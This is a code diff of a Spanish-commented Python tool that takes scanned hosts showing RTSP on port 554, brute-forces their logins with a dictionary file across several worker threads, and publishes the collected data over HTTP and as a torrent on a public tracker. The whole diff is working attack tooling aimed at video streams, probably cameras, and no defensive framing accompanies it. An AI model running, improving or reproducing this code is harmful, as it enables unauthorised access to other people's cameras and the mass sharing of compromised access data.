@@ -4,9 +4,10 @@ import time
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 import threading
 from queue import Queue
+from torrentool.api import Torrent
 
 from rtspBrute import RTSPBruteModule
-from common import cargar_datos, guardar_datos, eliminar_duplicados, buscar_palabra, actualizar_datos, extraer_texto_desde_imagen
+from common import cargar_datos, actualizar_datos
 
 class NoCacheHandler(SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -31,13 +32,26 @@ def start_http_server():
         print("Servidor detenido.")
         httpd.server_close()
 
+def create_torrent(file_path, output_dir):
+    # Crear un nuevo torrent a partir de un archivo o directorio
+    torrent = Torrent.create_from(file_path)  
+    torrent.announce_urls = ['udp://tracker.openbittorrent.com:80']
+    torrent_path = os.path.join(output_dir, 'datos.torrent')
+    torrent.to_file(torrent_path)  # Guardar el torrent
+
+    print(f"Torrent creado y guardado en {torrent_path}")
+
+def seed_torrent(torrent_path):
+    print(f"Sembrando: {torrent_path}")
+
 def brute_force_worker(q, dictionary_file):
     while True:
         target = q.get()
         if target is None:
             break
         ip, port = target
-        brute = RtspBrute(targets=[(ip, port)], dictionary_file=dictionary_file)
+        brute = RTSPBruteModule()
+        brute.setup(targets=[(ip, port)], dictionary_file=dictionary_file)
         brute.run()
         q.task_done()
 
@@ -46,19 +60,39 @@ if __name__ == '__main__':
     threading.Thread(target=actualizar_datos, daemon=True).start()
 
     # Iniciar el servidor HTTP en un hilo separado
-    server_thread = threading.Thread(target=start_http_server)
+    server_thread = threading.Thread(target=start_http_server, daemon=True)
     server_thread.start()
+
+    
+    json_file = 'datos.json'
+    if not os.path.exists('datos.torrent'):
+        create_torrent(json_file, '.')
+
+    # Iniciar el semillero del torrent
+    seed_thread = threading.Thread(target=seed_torrent, args=('datos.torrent',), daemon=True)
+    seed_thread.start()
 
     # Cargar los datos
     data = cargar_datos()
 
-    # Filtrar las entradas para obtener solo las que usan el puerto 554
-    targets = [(entry['IP'], entry['Puerto']) for entry in data if 'RTSP' in entry['Banner'] or entry['Puerto'] == 554]
+    # Filtrar las entradas para obtener solo las que usan el puerto 554 o contienen 'RTSP' en el banner
+    targets = [(entry['IP'], entry['Puerto']) for entry in data if 'RTSP' in entry.get('Banner', '') or entry.get('Puerto') == 554]
 
-    # Crear e iniciar el objeto RTSPBruteModule con todas las direcciones IP filtradas
-    brute = RTSPBruteModule()
-    brute.setup(targets=targets, dictionary_file="diccionario.txt")
-    brute.run()
+    # Crear una cola para los trabajos de brute force
+    q = Queue()
+    
+    # Enviar los targets a la cola
+    for target in targets:
+        q.put(target)
+
+    # Crear e iniciar los hilos de brute force
+    dictionary_file = "diccionario.txt"  # Asegúrate de que este archivo exista
+    num_worker_threads = 4  # Ajusta el número de hilos según sea necesario
+    for _ in range(num_worker_threads):
+        threading.Thread(target=brute_force_worker, args=(q, dictionary_file), daemon=True).start()
+
+    # Esperar a que todos los trabajos se completen
+    q.join()
 
     # Esperar a que el hilo del servidor HTTP termine antes de cerrar el programa principal
     server_thread.join()
